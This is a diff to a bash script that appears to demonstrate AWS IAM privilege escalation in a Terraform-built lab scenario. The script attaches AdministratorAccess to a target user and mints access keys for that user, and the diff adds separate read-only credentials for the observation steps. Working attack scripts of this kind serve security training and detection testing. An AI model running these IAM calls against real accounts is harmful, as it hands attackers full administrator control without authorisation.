@@ -67,6 +67,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -77,6 +86,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Target user: $TARGET_USER_NAME"
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
@@ -84,12 +94,22 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -104,15 +124,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify starting user lacks admin access
+# [EXPLOIT] Step 4: Verify starting user lacks admin access
 echo -e "${YELLOW}Step 4: Verifying starting user lacks admin access${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -122,14 +144,15 @@ else
 fi
 echo ""
 
-# Step 5: Verify target user's current permissions
+# [OBSERVATION] Step 5: Verify target user's current permissions
 echo -e "${YELLOW}Step 5: Checking target user's current permissions${NC}"
+use_readonly_creds
 echo "Getting target user details: $TARGET_USER_NAME"
-show_cmd "Attacker" "aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table"
+show_cmd "ReadOnly" "aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table"
 aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table
 
 echo "Listing target user's current attached managed policies:"
-show_cmd "Attacker" "aws iam list-attached-user-policies --user-name $TARGET_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $TARGET_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text"
 CURRENT_POLICIES=$(aws iam list-attached-user-policies --user-name $TARGET_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text)
 if [ -z "$CURRENT_POLICIES" ]; then
     echo "Current attached policies: (none)"
@@ -138,8 +161,9 @@ else
 fi
 echo -e "${GREEN}✓ Target user has limited permissions${NC}\n"
 
-# Step 6: Attach AdministratorAccess policy to target user
+# [EXPLOIT] Step 6: Attach AdministratorAccess policy to target user
 echo -e "${YELLOW}Step 6: Attaching AdministratorAccess managed policy to target user${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector..."
 echo "Attaching policy: $ADMIN_POLICY_ARN"
 echo "To user: $TARGET_USER_NAME"
@@ -156,15 +180,24 @@ echo -e "${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 7: Create access keys for target user
+# [EXPLOIT] Step 7: Create access keys for target user
 echo -e "${YELLOW}Step 7: Creating access keys for target user${NC}"
+use_starting_creds
 echo "Creating access keys for: $TARGET_USER_NAME"
 
 show_attack_cmd "Attacker" "aws iam create-access-key --user-name $TARGET_USER_NAME --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $TARGET_USER_NAME --output json)
+if [ $? -ne 0 ]; then
+    echo -e "${RED}Error: Failed to create access key (iam:CreateAccessKey denied)${NC}"
+    exit 1
+fi
 NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
 
+if [ -z "$NEW_ACCESS_KEY" ] || [ "$NEW_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Failed to extract access key from response${NC}"
+    exit 1
+fi
 echo "Created access key: $NEW_ACCESS_KEY"
 echo -e "${GREEN}✓ Successfully created access keys${NC}\n"
 
@@ -186,7 +219,7 @@ TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
 
-# Step 9: Verify administrator access
+# [OBSERVATION] Step 9: Verify administrator access
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
